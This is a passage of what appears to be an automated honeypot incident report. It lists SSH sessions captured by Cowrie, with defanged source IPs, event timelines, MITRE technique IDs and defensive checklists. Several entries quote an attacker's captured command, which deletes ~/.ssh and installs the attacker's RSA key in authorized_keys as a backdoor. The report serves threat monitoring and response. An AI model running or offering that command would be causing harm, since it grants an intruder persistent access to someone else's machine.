| `2026-07-22 07:54:48` | `cowrie.session.connect` |
| `2026-07-22 07:54:49` | `cowrie.client.version` |
| `2026-07-22 07:54:49` | `cowrie.client.kex` |
| `2026-07-22 07:54:51` | `cowrie.login.success` |
| `2026-07-22 07:54:52` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e750c3b0fa6e

| Field | Detail |
|---|---|
| **Source IP** | `113.160.209[.]29` |
| **First Seen** | 2026-07-22 07:55 |
| **Last Seen** | 2026-07-22 07:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:55:34` | `cowrie.session.connect` |
| `2026-07-22 07:55:35` | `cowrie.client.version` |
| `2026-07-22 07:55:35` | `cowrie.client.kex` |
| `2026-07-22 07:55:38` | `cowrie.login.success` |
| `2026-07-22 07:55:39` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.160.209[.]29` to AbuseIPDB if not already reported
- [ ] Block `113.160.209[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c943f5a9ee

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-22 07:55 |
| **Last Seen** | 2026-07-22 07:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:55:44` | `cowrie.session.connect` |
| `2026-07-22 07:55:45` | `cowrie.client.version` |
| `2026-07-22 07:55:45` | `cowrie.client.kex` |
| `2026-07-22 07:55:47` | `cowrie.login.success` |
| `2026-07-22 07:55:48` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9257f28e0e79

| Field | Detail |
|---|---|
| **Source IP** | `103.131.61[.]136` |
| **First Seen** | 2026-07-22 07:55 |
| **Last Seen** | 2026-07-22 07:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:55:59` | `cowrie.session.connect` |
| `2026-07-22 07:55:59` | `cowrie.client.version` |
| `2026-07-22 07:55:59` | `cowrie.client.kex` |
| `2026-07-22 07:56:00` | `cowrie.login.success` |
| `2026-07-22 07:56:01` | `cowrie.session.params` |
| `2026-07-22 07:56:01` | `cowrie.command.input` |
| `2026-07-22 07:56:01` | `cowrie.command.failed` |
| `2026-07-22 07:56:01` | `cowrie.log.closed` |
| `2026-07-22 07:56:02` | `cowrie.session.params` |
| `2026-07-22 07:56:02` | `cowrie.command.input` |
| `2026-07-22 07:56:03` | `cowrie.session.file_download` |
| `2026-07-22 07:56:03` | `cowrie.log.closed` |
| `2026-07-22 07:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.131.61[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.131.61[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806e6ef5067c

| Field | Detail |
|---|---|
| **Source IP** | `103.131.61[.]136` |
| **First Seen** | 2026-07-22 07:56 |
| **Last Seen** | 2026-07-22 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:56:03` | `cowrie.session.connect` |
| `2026-07-22 07:56:03` | `cowrie.client.version` |
| `2026-07-22 07:56:03` | `cowrie.client.kex` |
| `2026-07-22 07:56:04` | `cowrie.login.success` |
| `2026-07-22 07:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.131.61[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.131.61[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ecefaa90072

| Field | Detail |
|---|---|
| **Source IP** | `103.131.61[.]136` |
| **First Seen** | 2026-07-22 07:56 |
| **Last Seen** | 2026-07-22 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:56:05` | `cowrie.session.connect` |
| `2026-07-22 07:56:05` | `cowrie.client.version` |
| `2026-07-22 07:56:05` | `cowrie.client.kex` |
| `2026-07-22 07:56:06` | `cowrie.login.success` |
| `2026-07-22 07:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.131.61[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.131.61[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dac207e5a8f

| Field | Detail |
|---|---|
| **Source IP** | `14.153.247[.]36` |
| **First Seen** | 2026-07-22 07:57 |
| **Last Seen** | 2026-07-22 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:57:31` | `cowrie.session.connect` |
| `2026-07-22 07:57:32` | `cowrie.client.version` |
| `2026-07-22 07:57:32` | `cowrie.client.kex` |
| `2026-07-22 07:57:34` | `cowrie.login.success` |
| `2026-07-22 07:57:35` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.247[.]36` to AbuseIPDB if not already reported
- [ ] Block `14.153.247[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b322343399d

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-22 07:57 |
| **Last Seen** | 2026-07-22 07:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:57:42` | `cowrie.session.connect` |
| `2026-07-22 07:57:44` | `cowrie.client.version` |
| `2026-07-22 07:57:44` | `cowrie.client.kex` |
| `2026-07-22 07:57:47` | `cowrie.login.success` |
| `2026-07-22 07:57:47` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01355d2b58de

| Field | Detail |
|---|---|
| **Source IP** | `222.86.168[.]224` |
| **First Seen** | 2026-07-22 07:58 |
| **Last Seen** | 2026-07-22 07:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:58:09` | `cowrie.session.connect` |
| `2026-07-22 07:58:10` | `cowrie.client.version` |
| `2026-07-22 07:58:10` | `cowrie.client.kex` |
| `2026-07-22 07:58:14` | `cowrie.login.success` |
| `2026-07-22 07:58:15` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.86.168[.]224` to AbuseIPDB if not already reported
- [ ] Block `222.86.168[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18a25622d82d

| Field | Detail |
|---|---|
| **Source IP** | `222.252.16[.]237` |
| **First Seen** | 2026-07-22 07:58 |
| **Last Seen** | 2026-07-22 07:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:58:36` | `cowrie.session.connect` |
| `2026-07-22 07:58:40` | `cowrie.client.version` |
| `2026-07-22 07:58:40` | `cowrie.client.kex` |
| `2026-07-22 07:58:48` | `cowrie.login.success` |
| `2026-07-22 07:58:49` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.252.16[.]237` to AbuseIPDB if not already reported
- [ ] Block `222.252.16[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4afebea88e83

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-22 07:58 |
| **Last Seen** | 2026-07-22 07:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:58:56` | `cowrie.session.connect` |
| `2026-07-22 07:58:56` | `cowrie.client.version` |
| `2026-07-22 07:58:56` | `cowrie.client.kex` |
| `2026-07-22 07:58:57` | `cowrie.login.success` |
| `2026-07-22 07:58:58` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f675422a60

| Field | Detail |
|---|---|
| **Source IP** | `154.92.23[.]249` |
| **First Seen** | 2026-07-22 08:06 |
| **Last Seen** | 2026-07-22 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:06:11` | `cowrie.session.connect` |
| `2026-07-22 08:06:11` | `cowrie.client.version` |
| `2026-07-22 08:06:11` | `cowrie.client.kex` |
| `2026-07-22 08:06:11` | `cowrie.login.success` |
| `2026-07-22 08:06:12` | `cowrie.session.params` |
| `2026-07-22 08:06:12` | `cowrie.command.input` |
| `2026-07-22 08:06:12` | `cowrie.command.failed` |
| `2026-07-22 08:06:12` | `cowrie.log.closed` |
| `2026-07-22 08:06:12` | `cowrie.session.params` |
| `2026-07-22 08:06:12` | `cowrie.command.input` |
| `2026-07-22 08:06:12` | `cowrie.session.file_download` |
| `2026-07-22 08:06:12` | `cowrie.log.closed` |
| `2026-07-22 08:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.92.23[.]249` to AbuseIPDB if not already reported
- [ ] Block `154.92.23[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c6d1fb7effd

| Field | Detail |
|---|---|
| **Source IP** | `154.92.23[.]249` |
| **First Seen** | 2026-07-22 08:06 |
| **Last Seen** | 2026-07-22 08:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:06:12` | `cowrie.session.connect` |
| `2026-07-22 08:06:12` | `cowrie.client.version` |
| `2026-07-22 08:06:12` | `cowrie.client.kex` |
| `2026-07-22 08:06:12` | `cowrie.login.success` |
| `2026-07-22 08:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.92.23[.]249` to AbuseIPDB if not already reported
- [ ] Block `154.92.23[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a326ebc7e9be

| Field | Detail |
|---|---|
| **Source IP** | `154.92.23[.]249` |
| **First Seen** | 2026-07-22 08:06 |
| **Last Seen** | 2026-07-22 08:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:06:12` | `cowrie.session.connect` |
| `2026-07-22 08:06:12` | `cowrie.client.version` |
| `2026-07-22 08:06:12` | `cowrie.client.kex` |
| `2026-07-22 08:06:12` | `cowrie.login.success` |
| `2026-07-22 08:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.92.23[.]249` to AbuseIPDB if not already reported
- [ ] Block `154.92.23[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8105e431a708

| Field | Detail |
|---|---|
| **Source IP** | `45.162.8[.]14` |
| **First Seen** | 2026-07-22 08:06 |
| **Last Seen** | 2026-07-22 08:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:06:16` | `cowrie.session.connect` |
| `2026-07-22 08:06:16` | `cowrie.client.version` |
| `2026-07-22 08:06:16` | `cowrie.client.kex` |
| `2026-07-22 08:06:16` | `cowrie.login.success` |
| `2026-07-22 08:06:17` | `cowrie.session.params` |
| `2026-07-22 08:06:17` | `cowrie.command.input` |
| `2026-07-22 08:06:17` | `cowrie.command.failed` |
| `2026-07-22 08:06:17` | `cowrie.log.closed` |
| `2026-07-22 08:06:18` | `cowrie.session.params` |
| `2026-07-22 08:06:18` | `cowrie.command.input` |
| `2026-07-22 08:06:18` | `cowrie.session.file_download` |
| `2026-07-22 08:06:18` | `cowrie.log.closed` |
| `2026-07-22 08:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.162.8[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.162.8[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c849293079

| Field | Detail |
|---|---|
| **Source IP** | `45.162.8[.]14` |
| **First Seen** | 2026-07-22 08:06 |
| **Last Seen** | 2026-07-22 08:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:06:18` | `cowrie.session.connect` |
| `2026-07-22 08:06:18` | `cowrie.client.version` |
| `2026-07-22 08:06:18` | `cowrie.client.kex` |
| `2026-07-22 08:06:19` | `cowrie.login.success` |
| `2026-07-22 08:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.162.8[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.162.8[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78cf6a38f73b

| Field | Detail |
|---|---|
| **Source IP** | `45.162.8[.]14` |
| **First Seen** | 2026-07-22 08:06 |
| **Last Seen** | 2026-07-22 08:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:06:19` | `cowrie.session.connect` |
| `2026-07-22 08:06:19` | `cowrie.client.version` |
| `2026-07-22 08:06:19` | `cowrie.client.kex` |
| `2026-07-22 08:06:20` | `cowrie.login.success` |
| `2026-07-22 08:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.162.8[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.162.8[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1d82093ece2

| Field | Detail |
|---|---|
| **Source IP** | `219.129.96[.]2` |
| **First Seen** | 2026-07-22 08:07 |
| **Last Seen** | 2026-07-22 08:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:07:14` | `cowrie.session.connect` |
| `2026-07-22 08:07:15` | `cowrie.client.version` |
| `2026-07-22 08:07:15` | `cowrie.client.kex` |
| `2026-07-22 08:07:19` | `cowrie.login.success` |
| `2026-07-22 08:07:20` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.96[.]2` to AbuseIPDB if not already reported
- [ ] Block `219.129.96[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-904ca69b3d77

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-22 08:07 |
| **Last Seen** | 2026-07-22 08:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:07:30` | `cowrie.session.connect` |
| `2026-07-22 08:07:30` | `cowrie.client.version` |
| `2026-07-22 08:07:30` | `cowrie.client.kex` |
| `2026-07-22 08:07:32` | `cowrie.login.success` |
| `2026-07-22 08:07:33` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21174975d2f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 08:10 |
| **Last Seen** | 2026-07-22 08:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:10:27` | `cowrie.session.connect` |
| `2026-07-22 08:10:27` | `cowrie.client.version` |
| `2026-07-22 08:10:28` | `cowrie.client.kex` |
| `2026-07-22 08:10:28` | `cowrie.login.success` |
| `2026-07-22 08:10:28` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:10:28` | `cowrie.direct-tcpip.data` |
| `2026-07-22 08:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b5fb29e3bb

| Field | Detail |
|---|---|
| **Source IP** | `49.51.231[.]222` |
| **First Seen** | 2026-07-22 08:12 |
| **Last Seen** | 2026-07-22 08:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:12:12` | `cowrie.session.connect` |
| `2026-07-22 08:12:12` | `cowrie.client.version` |
| `2026-07-22 08:12:12` | `cowrie.client.kex` |
| `2026-07-22 08:12:13` | `cowrie.login.success` |
| `2026-07-22 08:12:14` | `cowrie.session.params` |
| `2026-07-22 08:12:14` | `cowrie.command.input` |
| `2026-07-22 08:12:14` | `cowrie.command.failed` |
| `2026-07-22 08:12:15` | `cowrie.log.closed` |
| `2026-07-22 08:12:15` | `cowrie.session.params` |
| `2026-07-22 08:12:15` | `cowrie.command.input` |
| `2026-07-22 08:12:16` | `cowrie.session.file_download` |
| `2026-07-22 08:12:16` | `cowrie.log.closed` |
| `2026-07-22 08:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.231[.]222` to AbuseIPDB if not already reported
- [ ] Block `49.51.231[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd11fff5132f

| Field | Detail |
|---|---|
| **Source IP** | `49.51.231[.]222` |
| **First Seen** | 2026-07-22 08:12 |
| **Last Seen** | 2026-07-22 08:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:12:19` | `cowrie.session.connect` |
| `2026-07-22 08:12:19` | `cowrie.client.version` |
| `2026-07-22 08:12:19` | `cowrie.client.kex` |
| `2026-07-22 08:12:19` | `cowrie.login.success` |
| `2026-07-22 08:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.231[.]222` to AbuseIPDB if not already reported
- [ ] Block `49.51.231[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f355735caaf6

| Field | Detail |
|---|---|
| **Source IP** | `49.51.231[.]222` |
| **First Seen** | 2026-07-22 08:12 |
| **Last Seen** | 2026-07-22 08:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:12:19` | `cowrie.session.connect` |
| `2026-07-22 08:12:19` | `cowrie.client.version` |
| `2026-07-22 08:12:20` | `cowrie.client.kex` |
| `2026-07-22 08:12:21` | `cowrie.login.success` |
| `2026-07-22 08:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.231[.]222` to AbuseIPDB if not already reported
- [ ] Block `49.51.231[.]222` at perimeter firewall / security group
